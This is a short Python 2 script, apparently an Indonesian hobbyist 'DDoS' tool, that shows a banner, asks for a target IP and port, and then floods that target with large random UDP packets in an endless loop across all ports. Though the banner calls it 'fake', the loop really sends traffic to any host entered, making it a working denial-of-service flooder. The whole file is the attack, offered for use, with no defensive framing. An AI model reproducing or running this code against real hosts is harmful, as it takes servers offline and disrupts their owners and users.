
import sys
import os
import time
import socket
import random

K = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'
A = '\033[99m'

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9999)
#############

os.system("clear")
os.system("figlet AGUSSAMP|FAKE DDOS|")
print
print (H+"AUTHOR   : AGUSSAMP|FAKEDDOS|IP/PORT|")
print (H+"TEAM     : AGUSSAMP PO 1 ABADI")
print (H+"THANKS   : THANKS PEMELIK TOLLS")
print (H+"TEAM FAKE   : |NONE|NONE|NONE|")
print (H+"AYO   : |DDOS|SKUY|SAMPAH|")
print (H+"ANTI DDOS   : |CLEAR|DDOS|VISUAL/INGAME|")
print (H+"PENGGUNA   : |DDOS|SERVER|IP/PORT|")
print (K+"LOAD   : |IP|PORT|SERVER/OWNER|")
print
ip = raw_input(R+"IP TARGET : ")
port = input(R+"Port       : ")

os.system("clear")
os.system("figlet Paket Bragkat")
print "[ PROSES  ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (A+"Sent %s  PAKET OTW %s KE SERVER PORT port %s"%(sent,ip,port))
     if port == 65534:
       port = 1